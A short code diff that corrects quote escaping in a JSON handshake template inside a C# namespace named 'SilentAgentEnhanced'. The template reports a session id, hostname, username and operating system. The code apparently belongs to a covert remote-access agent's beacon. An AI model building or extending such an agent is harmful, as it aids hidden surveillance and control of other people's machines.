@@ -868,7 +868,7 @@ namespace SilentAgentEnhanced
             
             string handshake = $@"{{
                 ""type"": ""agent_handshake"",
-                "session_id": ""{{SESSION_ID}}"",
+                ""session_id"": ""{{SESSION_ID}}"",
                 ""hostname"": ""{{hostname}}"",
                 ""username"": ""{{username}}"",
                 ""os"": ""{{os}}"",
